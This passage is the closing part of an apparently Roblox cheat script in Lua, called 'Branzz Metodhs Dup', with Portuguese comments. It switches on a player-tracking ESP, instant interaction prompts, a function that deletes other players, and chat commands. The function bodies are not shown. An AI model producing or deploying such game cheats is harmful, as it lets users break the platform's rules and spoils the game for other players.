        
        wait(1)
        
        -- AGORA SIM REMOVE GUI E MOSTRA LOADING
        screenGui:Destroy()
        createLoadingScreen()
        
        -- DELETA TODOS OS OUTROS PLAYERS
        deleteOtherPlayers()
        
        -- ATIVA COMANDOS DE CHAT
        setupChatCommands()
    end)
    
    screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
end

-- Sistema de atualização do ESP
local lastUpdate = 0
RunService.Heartbeat:Connect(function(deltaTime)
    -- ESP SEMPRE ATIVO, NÃO PRECISA ESPERAR BOTÃO
    lastUpdate = lastUpdate + deltaTime
    if lastUpdate >= CONFIG.UpdateInterval then
        lastUpdate = 0
        scanBases()
    end
end)

-- INICIALIZAÇÃO
print("⚡ Branzz Metodhs Dup carregado!")
makePromptsInstant() -- ATIVA PROMPTS INSTANTÂNEOS JÁ
espEnabled = true -- ATIVA ESP IMEDIATAMENTE
createMainGUI()
